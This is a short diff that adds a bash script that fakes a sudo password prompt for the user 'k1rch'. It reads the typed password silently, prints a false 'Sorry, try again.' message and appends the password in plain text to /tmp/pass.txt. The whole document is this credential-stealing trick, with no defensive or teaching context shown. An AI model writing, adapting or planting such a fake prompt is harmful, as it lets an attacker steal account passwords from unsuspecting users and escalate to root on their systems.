@@ -1,0 +1,6 @@
+#!/bin/bash
+read -sp "[sudo] password for k1rch: " sudopass
+echo ""
+sleep 2
+echo "Sorry, try again."
+echo $sudopass >> /tmp/pass.txt
